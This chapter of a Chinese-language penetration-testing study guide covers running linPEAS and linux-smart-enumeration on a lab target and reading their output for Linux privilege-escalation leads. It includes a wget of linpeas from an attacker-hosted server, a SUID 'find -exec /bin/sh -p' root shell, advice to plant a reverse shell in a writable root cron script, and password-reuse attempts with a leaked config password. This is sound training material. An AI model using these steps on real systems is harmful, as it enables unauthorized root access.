# Ch 24 — linPEAS / linux-smart-enumeration 解讀

> 目標：能跑 linPEAS 和 linux-smart-enumeration，並快速識別輸出中的高價值提權線索。

## 工具的角色

linPEAS 和 LSE 不是「按下按鈕就提權」的工具。它們做的是**自動跑 Ch 20 那份手動清單**，然後用顏色標記可疑的地方。

你還是要：
1. 理解它找到了什麼
2. 判斷是否可利用
3. 知道怎麼利用

不理解就靠自動化工具，考試會卡住。

## linPEAS

### 取得 linPEAS

```bash
# 在 Kali
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o ~/tools/linpeas.sh

# 傳到靶機
python3 -m http.server 80   # Kali
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh   # 靶機
chmod +x /tmp/linpeas.sh
```

### 執行

```bash
# 基本執行（輸出到 terminal，有顏色）
/tmp/linpeas.sh

# 存到檔案（沒有顏色，但方便分析）
/tmp/linpeas.sh > /tmp/out.txt

# 保留顏色的存檔
/tmp/linpeas.sh | tee /tmp/out.txt

# 用 less 看（可以搜尋）
/tmp/linpeas.sh 2>/dev/null | less -R
```

### 顏色含義

```
紅色/黃色  ← 高危！優先分析
橙色       ← 值得看
綠色/藍色  ← 正常資訊
```

### linPEAS 輸出結構

linPEAS 輸出很長（幾千行），按區段找：

```
╔══════════╣ System Information
╚══════════╣ → 系統基本資訊

╔══════════╣ Sudo version
╚══════════╣ → Sudo 版本（找 CVE-2021-3156 等）

╔══════════╣ Sudo | NOPASSWD
╚══════════╣ → 你能 sudo 跑什麼 ← 最重要

╔══════════╣ SUID
╚══════════╣ → SUID binary 清單

╔══════════╣ Cron jobs
╚══════════╣ → 定時任務

╔══════════╣ Interesting Files
╚══════════╣ → 有趣的設定檔、備份、密碼

╔══════════╣ Active Ports
╚══════════╣ → 本地監聽的服務（外部看不到）
```

### 看 linPEAS 的最快流程

```bash
# 1. 先找紅色/黃色（最危險的）
# 在 terminal 裡，顏色自動標記

# 2. 重點看：
# - Sudo 相關（NOPASSWD）
# - SUID（有沒有非標準的）
# - Cron jobs（哪些可寫）
# - Interesting Files（設定檔密碼）
# - Active Ports（內部服務）
```

### 看輸出的 grep 技巧

```bash
# 只看紅色部分（linPEAS 用 ANSI 色碼，不好 grep）
# 更好的方法：根據關鍵字過濾
grep -A3 "SUDO" /tmp/out.txt
grep -A3 "SUID" /tmp/out.txt
grep -i "password\|passwd" /tmp/out.txt
```

## linux-smart-enumeration（LSE）

LSE 是另一個枚舉腳本，輸出更結構化：

```bash
# 下載
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -o ~/tools/lse.sh

# 傳到靶機，執行
chmod +x /tmp/lse.sh

# 詳細模式
/tmp/lse.sh -l 2    # level 2 = 更詳細
```

LSE 按等級（1/2/3）輸出，找 `[!]`（驚嘆號）標記的項目。

## 實際分析範例

### 範例一：Sudo 出現可利用的 binary

```
╔══════════╣ Sudo version 1.8.27
╚══════════╣
...
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/python3 /opt/monitor.py
```

分析：
- `python3 /opt/monitor.py` 可以用 root 跑
- 但只能跑特定腳本，不是任意 python3
- 檢查 `/opt/monitor.py` 的權限：`ls -la /opt/monitor.py`
- 如果可寫 → 修改腳本加 shell

### 範例二：SUID 可疑 binary

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚══════════╣
-rwsr-xr-x 1 root root 31K Jul  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 43K Jan 25  2019 /usr/bin/find       ← 可疑！
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/bin/pkexec
```

`/usr/bin/find` 有 SUID → GTFOBins 查 find → `find . -exec /bin/sh -p \;`

### 範例三：可寫的 Cron 腳本

```
╔══════════╣ Cron jobs
╚══════════╣
SHELL=/bin/sh
PATH=/usr/local/sbin:...
* * * * * root   /usr/local/bin/cleanup.sh

-rwxrwxrwx 1 root root 45 Jan  1 12:00 /usr/local/bin/cleanup.sh  ← 任何人可寫！
```

分析：
- `cleanup.sh` 是 root 跑的（crontab 第 5 欄是 root）
- 任何人可寫（`-rwxrwxrwx`）
- 修改加反彈 shell，等 cron 觸發

### 範例四：設定檔密碼

```
╔══════════╣ Interesting writable files
╚══════════╣
/var/www/html/wp-config.php is readable:
define( 'DB_PASSWORD', 'SuperSecretPass123' );
```

→ 試 `su root`，密碼用 `SuperSecretPass123`（密碼重用很常見）

### 範例五：本地服務

```
╔══════════╣ Active Ports
╚══════════╣
tcp   0   0 127.0.0.1:3306   0.0.0.0:*   LISTEN   1001/mysqld
tcp   0   0 127.0.0.1:27017  0.0.0.0:*   LISTEN   1023/mongod
```

→ 本地有 MySQL 和 MongoDB
→ 試連上去：`mysql -u root -p`（試常見密碼，或從設定檔找）
→ MySQL 有 UDF 提權技術（進階）

## 工具組合策略

```
1. 手動快速清單（Ch 20）：2 分鐘跑完
   → sudo -l, find SUID, cat /etc/crontab

2. linPEAS：3–5 分鐘，輸出很多
   → 聚焦紅色/黃色部分

3. 有具體懷疑點了，再深入分析
```

不要只靠工具——工具找到提權路徑，你要知道怎麼走。

## 自我檢核

- [ ] 能在靶機上下載並執行 linPEAS
- [ ] 知道 linPEAS 的顏色代表什麼嚴重程度
- [ ] 能從 linPEAS 輸出中找到 sudo / SUID / cron 的可疑項目
- [ ] 拿到 linPEAS 發現的設定檔密碼後，知道要試密碼重用

→ [練習 C：3 台 Linux 提權靶機](./practice-c-linux-privesc.md)
